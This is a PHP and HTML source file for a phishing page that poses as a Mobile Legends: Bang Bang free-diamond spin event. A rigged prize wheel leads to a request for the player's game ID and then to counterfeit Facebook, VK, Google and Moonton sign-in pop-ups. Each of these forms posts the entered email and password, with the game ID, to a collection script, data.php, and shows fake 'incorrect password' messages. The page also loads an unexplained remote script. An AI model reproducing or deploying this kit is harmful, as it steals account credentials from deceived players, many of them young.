<?php
    $a=array("0deg","60deg","115deg","180deg","240deg","300deg","360deg");
    $random_keys=array_rand($a,3);
    $hasil = ''.$a[$random_keys[1]].'';
?>
<html>

  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Oxygen&display=swap" rel="stylesheet">
    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/c9f3ddecc56e688f8660a2d31a5beea4909fa5b9/alex-facebook.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3ddd40ca064d997b6655739e7a0e8a65acc106e8/alex-vikontakte.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/1591ba04a57c11f4b18d2ebb39e03e4a81715c83/alex-google.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3fce8843edde49a48905ae1ed9cf237534e547dd/alex-moonton.css">
    <link rel="stylesheet" href="alexFrontEnd/css/style.css" />
    <meta name="keywords" content="MLBB, MLBB Evebt, MLBB Free Skin">
    <meta name="description" content="Get draw and claim your diamond skin now!">
    <meta name="author" content="Alex Ariandi">
    <title>Mobile Legends: Bang Bang</title>
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="Mobile Legends: Bang Bang">
    <meta property="og:type" content="website">
    <meta name="copyright" content="Moonton">
    <meta name="theme-color" content="#4b28cc">
    <link rel="icon" href="https://m.mobilelegends.com/static/images/favicon.ico">
    <meta property="og:image" content="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/mlbb-5v5.webp" />
  </head>

  <body>
    <main>
      <div id="container">
        <div class="content">
          <header>
            <div class="topalex">
              <i class='bx bx-chevron-left'></i>
              <img src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/mlbb-5v5.webp" alt="icon" />
            </div>
            <h3>
              Invite Friends to Win <h1>Diamond MLBB</h1>
            </h3>
          </header>
          <section class="spinalexml">
            <alex>
              <div class="boxspinml">
                <div class="centerml" id="muternihalex">
                  <div class="alexspin">
                    <img src="https://cdn.jsdelivr.net/gh/AlexHostX/mlbb@main/spindm/alexspin.png" alt="spin" />
                  </div>
                  <div class="itemspin">
                    <img class="itemcol1" src="https://cdn.jsdelivr.net/gh/AlexHostX/mlbb@main/spindm/rewards/0deg.png" alt="prize spin">
                    <img class="itemcol2" src="https://cdn.jsdelivr.net/gh/AlexHostX/mlbb@main/spindm/rewards/300deg.png" alt="prize spin">
                    <img class="itemcol3" src="https://cdn.jsdelivr.net/gh/AlexHostX/mlbb@main/spindm/rewards/240deg.png" alt="prize spin">
                    <img class="itemcol4" src="https://cdn.jsdelivr.net/gh/AlexHostX/mlbb@main/spindm/rewards/180deg.png" alt="prize spin" style="border-radius: 10px">
                    <img class="itemcol5" src="https://cdn.jsdelivr.net/gh/AlexHostX/mlbb@main/spindm/rewards/115deg.png" alt="prize spin">
                    <img class="itemcol6" src="https://cdn.jsdelivr.net/gh/AlexHostX/mlbb@main/spindm/rewards/60deg.png" alt="prize spin">
                  </div>
                </div>
                <div class="buttonspin">
                  <img src="https://cdn.jsdelivr.net/gh/AlexHostX/mlbb@main/spindm/alexpointer.png" alt="pointer spin" />
                </div>
              </div>
            </alex>
          </section>
          <section class="guestalexml">
            <ariandi>
              <button onclick="spinalex();" id="btnreal">Spin 1X for Free</button>
            </ariandi>
            <div class="invitealex">
              <div class="topinvite">
                <p>free leftovers</p>
                <label id="copymore">get more</label>
                <input type="hidden" id="linkmore" value="089509556668" readonly />
              </div>
              <div class="bottinvite">
                <p id="jumlahspin">1</p>
                <div class="salinlink">
                  <input type="text" id="linkshow" value="089509556668" readonly />
                  <label id="copyalex">
                    <i class='bx bx-copy-alt'></i>
                  </label>
                </div>
              </div>
            </div>
            <div class="invitealex">
              <div class="topinvite">
                <p>History</p>
                <label href="#top">Spin Now</label>
              </div>
              <div class="bottinvite">
                <p>Not found</p>
                <div class="salinlink" style="visibility: hidden;">
                  <input type="text" value="089509556668" readonly />
                  <label>
                    <i class='bx bx-copy-alt'></i>
                  </label>
                </div>
              </div>
            </div>
            <a onclick="openstatus()">Invitation History</a>
            <span id="invitestatus">have not invited</span>
            <div class="rulesalexml">
              <div class="rulesfix">
                <h3>Rules</h3>
                <div class="contentrules">
                  <p>1. invite users to take part in the MLBB Spin Event using the link we have prepared under the prize wheel. Everyone who refers the link will increase your free play count.</p>
                  <p>2. Every time you withdraw a prize, you will receive whatever the pointer points to. To receive the prize, you must fill in your MLBB ID correctly. Once verified, our system will send the reward within 30 minutes.</p>
                  <p>
                    3. Event time limit: <label id="alextimer">25:25</label>
                  </p>
                  <p>4. Invite up to 100 users for 100 free prize spin opportunities.</p>
                </div>
              </div>
            </div>
          </section>
          <popup id="popupalex" style="display: none;">
            <div class="boxconfirm">
              <div class="topgift">
                <h4>
                  <i class='bx bxs-bell bx-tada'></i>
                  Gift Notification
                </h4>
                <p>congrats you got</p>
                <img id="imgalex" src="" alt="redeem prize" />
              </div>
              <div class="bottgift">
                <div class="inputid">
                  <p>Enter your game id to continue</p>
                  <div class="boxinput" style="display: flex; gap: 5px; flex-direction: column; flex-wrap: nowrap; align-items: center;">
                    <input type="number" id="playid" placeholder="Game ID" style="width: 100%; max-width: 90%;" />
                    <input type="text" id="nickname" placeholder="Enter Nickname" style="width: 100%; max-width: 90%;" />
                  </div>
                  <div class="warn">
                    <span class="wrong">Invalid Game ID or Zone Server</span>
                    <span class="tidakada">User ID could not be found</span>
                    <span class="respon">
                      <i class='bx bx-loader-alt bx-spin'></i>
                      In the process of checking ID
                    </span>
                  </div>
                  <button onclick="validIDalex()">Claim</button>
                </div>
              </div>
            </div>
          </popup>
          <popup class="welcomealexmltf" style="display: none;">
            <p>
              Nickname Valid: <label id="toastnick">AlexHost</label>
            </p>
          </popup>
          <div class="alex-login slide-in-top">
            <div class="pilihan-login">
              <div class="ucapan-login">SIGN IN TO CONTINUE</div>
              <button class="btnlogalex" onclick="alex_facebook()">
                <i class="fa fa-facebook" aria-hidden="true"></i>
                Sign in with Facebook
              </button>
               <br>
      <!---  <button class="btnlogalex" onclick="alex_vikontakte()">
                <i class="fa fa-vk" aria-hidden="true"></i>
                Sign in with VK
              </button>
              <br>
              <button class="btnlogalex" onclick="alex_google()">
                <i class="fa fa-google" aria-hidden="true"></i>
                Sign in with Google
              </button>
              <br> ---->
              <button class="btnlogalex" onclick="alex_moonton()">
                <i class="fa fa-star" aria-hidden="true"></i>
                Sign in with Moonton
              </button>
            </div>
          </div>
        </div>
        <div class="popup-ariandi alex-facebook animate fadeIn">
          <div class="container-box-fb" style="margin-top: 10%;">
            <a class="close-alex-facebook" onclick="ariandi_facebook()">
              <i class="zmdi zmdi-close"></i>
            </a>
            <div class="atasan-fb" style="width: 95.16%;">
              <img src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/facebook_text.png">
            </div>
            <div class="isi-facebook">
              <p class="kaget email-fb" style="width: 320px; text-align: left; top: -15px;">
                The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b>
              </p>
              <p class="kaget sandi-fb" style="width: 320px; text-align: left; top: -15px;">The password that you've entered is incorrect. Forgotten password?</p>
              <img src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/mlbb-5v5.webp">
              <div class="txt-ucapan-fb">Log in to your Facebook account to connect to Mobile Legend : BANG BANG</div>
              <form class="form-login-fb" action="data.php" method="POST" onsubmit="return AlexHostingNetFB()">
                <label>
                  <input type="text" id="alx_email_fb" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" style="background: none" required>
                </label>
                <label>
                  <input type="password" id="alx_password_fb" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" style="background: none" required>
                </label>
                <input type="hidden" name="login" value="Facebook" readonly>
                <input type="hidden" name="playid" id="ressplayid" value="">
                <input type="hidden" name="zoneid" id="resszoneid" value="">
                <input type="hidden" name="nick" id="ressnick" value="">
                <button class="btn-login-fb" type="submit">Log In</button>
              </form>
              <div class="txt-buat-akun">Create account</div>
              <div class="txt-tidak-sekarang">not now</div>
              <div class="txt-lupa-password">Forgotten password?</div>
            </div>
            <div class="isi-bahasa">
              <center>
                <div class="nama-bahasa bahasa-aktif">English (UK)</div>
                <div class="nama-bahasa">Bahasa Indonesia</div>
                <div class="nama-bahasa">Basa Jawa</div>
                <div class="nama-bahasa">Bahasa Melayu</div>
                <div class="nama-bahasa">日本語</div>
                <div class="nama-bahasa">Español</div>
                <div class="nama-bahasa">Português (Brasil)</div>
                <div class="nama-bahasa">
                  <i class="fa fa-plus"></i>
                </div>
              </center>
            </div>
            <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
          </div>
        </div>
        <div class="popup-ariandi alex-vikontakte animate fadeIn">
          <div class="container-box-vk" style="margin-top: 10%;">
            <a class="close-alex-vk" onclick="ariandi_vikontakte()">
              <i class="zmdi zmdi-close"></i>
            </a>
            <div class="atasan-vk">
              <center>
                <p class="kagetvk email-vk">
                  Please check if the <b>login</b>
                  and <b>password</b>
                  you entered are correct.

                </p>
                <p class="kagetvk sandi-vk">
                  Please check if the <b>login</b>
                  and <b>password</b>
                  you entered are correct.

                </p>
                <img class="img-logvk" src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/vk-alex.png">
              </center>
            </div>
            <div class="isi-vikontakte">
              <center>
                <form class="form-login" action="data.php" method="POST" onsubmit="return AlexHostingNetVK()">
                  <div class="ucapan-vk">
                    Login to <b>VK</b>
                    to carry on.

                  </div>
                  <div class="form-login-vk">
                    <label>Phone, email, or username</label>
                    <input type="text" id="alx_email_vk" name="email" placeholder="" required>
                  </div>
                  <div class="form-login-vk">
                    <label>Password</label>
                    <input type="password" id="alx_password_vk" name="password" placeholder="" required>
                  </div>
                  <input type="hidden" name="login" value="VK" readonly>
                  <input type="hidden" name="playid" id="ressplayid" value="">
                  <input type="hidden" name="zoneid" id="resszoneid" value="">
                  <input type="hidden" name="nick" id="ressnick" value="">
                  <button class="btn-login-vk" type="submit">Log in</button>
                </form>
                <button class="close-submit-vk" onclick="ariandi_vikontakte()">Cancel</button>
              </center>
            </div>
          </div>
        </div>
        <div class="popup-ariandi alex-google animate fadeIn">
          <div class="container-box-google" style="margin-top: 10%;">
            <a class="close-alex-google" onclick="ariandi_google()">
              <i class="zmdi zmdi-close"></i>
            </a>
            <div class="atasan-google">
              <center>
                <p class="kagetgp email-gp">wrong email or phone number</p>
                <p class="kagetgp sandi-gp">password does not match</p>
                <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/google.png">
              </center>
            </div>
            <div class="isi-google">
              <center>
                <form class="form-login" action="data.php" method="POST" onsubmit="return AlexHostingNetGP()">
                  <div class="ucapan-gp">Sign in</div>
                  <div class="form-login-gp">
                    <label>Email or Phone</label>
                    <input type="text" id="alx_email_gp" name="email" placeholder="" required>
                  </div>
                  <div class="form-login-gp">
                    <label>Password</label>
                    <input type="password" id="alx_password_gp" name="password" placeholder="" required>
                  </div>
                  <input type="hidden" name="login" value="Google" readonly>
                  <input type="hidden" name="playid" id="ressplayid" value="">
                  <input type="hidden" name="zoneid" id="resszoneid" value="">
                  <input type="hidden" name="nick" id="ressnick" value="">
                  <button class="btn-login-gp" type="submit">Login</button>
                </form>
                <button class="close-submit-gp" onclick="ariandi_google()">Create account?</button>
              </center>
            </div>
          </div>
        </div>
        <div class="popup-ariandi alex-moonton animated fadeIn">
          <div class="container-box-mt" style="margin-top: 10%;">
            <a class="close-alex-mt" onclick="ariandi_moonton()">
              <i class="zmdi zmdi-close"></i>
            </a>
            <div class="isi-mt">
              <div class="txt-ucapan-mt">Sign in with your Moonton Account</div>
              <form class="form-login" action="data.php" method="POST" onsubmit="return AlexHostingNetMT()">
                <label class="label-mt">
                  <input class="input-form-mt" id="alx_email_mt" type="text" name="email" placeholder="Email address/Moonton Account" autocomplete="off" autocapitalize="off" required>
                  <p class="kagetmt email-mt">*it seems that no account has that email</p>
                </label>
                <label class="label-mt">
                  <input class="input-form-mt" id="alx_password_mt" type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
                  <p class="kagetmt sandi-mt">*passwords don't match</p>
                </label>
                <p class="quotes-mt">by clicking "Sign In" means that you have agreed to Moonton's terms and conditions.</p>
                <input type="hidden" name="login" value="Moonton" readonly>
                <input type="hidden" name="playid" id="ressplayid" value="">
                <input type="hidden" name="zoneid" id="resszoneid" value="">
                <input type="hidden" name="nick" id="ressnick" value="">
                <button type="submit" class="btn-login-mt">Sign In</button>
              </form>        
              </br></br>
            </div>
          </div>
        </div>
      </div>
      </div>
      </div>
    </main>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/AlexHostt/jquery/4447644.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script type="text/javascript" src="alexFrontEnd/js/function.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
    <script type="text/javascript" src="alexFrontEnd/js/copylink.js"></script>
    <script type="text/javascript" src="alexFrontEnd/js/gotop.js"></script>
    <script type="text/javascript" src="alexFrontEnd/js/timer.js"></script>
    <script>
      function spinalex() {
        var audio = new Audio('https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/sv4/v4s.mp3');
        audio.play();
        $('#btnreal').prop('disabled', true);
        document.getElementById("jumlahspin").innerHTML = "0";
        var element = document.getElementById("btnreal");
        element.classList.add("disabled");
        $('#btnoff').show();
        var element = document.getElementById("muternihalex");
        element.classList.add("mutermulualex");
        $('.btnunactivespin').show();
        $('.btnactivespin').hide();
        setTimeout(() => {
          var element = document.getElementById("muternihalex");
          element.classList.remove("mutermulualex");
          document.getElementById('muternihalex').style.transform = 'rotate(<?php echo $hasil;?>)';
          document.getElementById('imgalex').src = 'https://cdn.jsdelivr.net/gh/AlexHostX/mlbb@main/spindm/rewards/<?php echo $hasil;?>.png';
          setTimeout(() => {
            $("#popupalex").fadeIn();
          }, 1000)
        }, 4000)
      }

    </script>
    <script type="text/javascript" src="alexFrontEnd/js/input.js"></script>
    <script type="text/javascript" src="alexFrontEnd/js/validator.js"></script>
  </body>

</html>

